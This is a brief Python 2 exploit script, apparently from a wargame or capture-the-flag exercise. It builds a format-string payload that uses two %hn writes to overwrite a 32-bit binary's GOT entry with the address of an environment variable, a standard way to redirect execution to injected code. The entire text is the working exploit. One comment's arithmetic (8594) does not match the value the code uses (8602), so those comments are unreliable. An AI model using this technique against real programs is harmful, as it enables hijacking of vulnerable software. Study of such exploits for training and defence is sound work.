import struct

# env_addr = 0xffffde65
# 0xde65 = 56933
# -8 -> 56925
# 0xffff = 65535
# -56925 = 8594
fmt = "%56925x" + "%10$hn" + "%8602x" + "%11$hn"
lil_got = struct.pack("<I", 0x080497e0)
big_got = struct.pack("<I", 0x080497e2)

print lil_got + big_got + fmt
